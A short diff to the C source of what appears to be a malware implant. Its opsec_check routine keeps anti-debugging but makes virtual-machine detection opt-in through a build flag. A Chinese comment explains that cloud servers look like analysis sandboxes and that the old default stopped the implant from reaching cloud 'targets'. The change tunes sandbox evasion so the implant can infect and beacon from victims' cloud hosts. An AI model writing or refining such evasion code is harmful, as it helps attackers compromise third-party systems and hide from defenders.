@@ -1511,8 +1511,15 @@ int opsec_check(void) {
     // Anti-debug is blocking
     if (opsec_anti_debug() != 0) return -1;
 
-    // VM detection is blocking
+    // VM detection is blocking ONLY behind OPSEC_VM_EXIT（构建选项 opsec_vm_exit）。
+    //
+    // 为什么不再默认拦：公有云主机（阿里云/腾讯云/AWS ECS…）的 DMI 就是
+    // KVM/QEMU/Xen，cpuinfo 也带 hypervisor 标志 —— 与分析沙箱**不可区分**。
+    // 默认拦截等于把所有云目标全部误杀（"某些环境无法上线"的头号根因）。
+    // 沙箱本身还有 anti_debug 兜底；确有"只打物理机"需求时显式勾选即可恢复旧行为。
+#ifdef OPSEC_VM_EXIT
     if (opsec_vm_detect() != 0) return -1;
+#endif
 
     // Container detection is informational — don't block
     // opsec_container_detect();
